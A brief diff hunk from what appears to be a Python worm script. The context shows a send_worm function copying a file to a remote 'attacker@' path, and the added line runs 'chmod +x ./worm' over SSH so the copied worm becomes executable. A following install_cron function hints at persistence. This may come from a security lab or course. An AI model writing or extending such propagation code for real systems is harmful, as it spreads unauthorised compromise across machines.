@@ -107,6 +107,7 @@ def send_worm(pw):
                 "attacker@{}:{}".format(sys.argv[1], path),
             ]
         )
+        send_ssh(pw, "cd {} && chmod +x ./worm".format(path))
 
 
 def install_cron(pw):
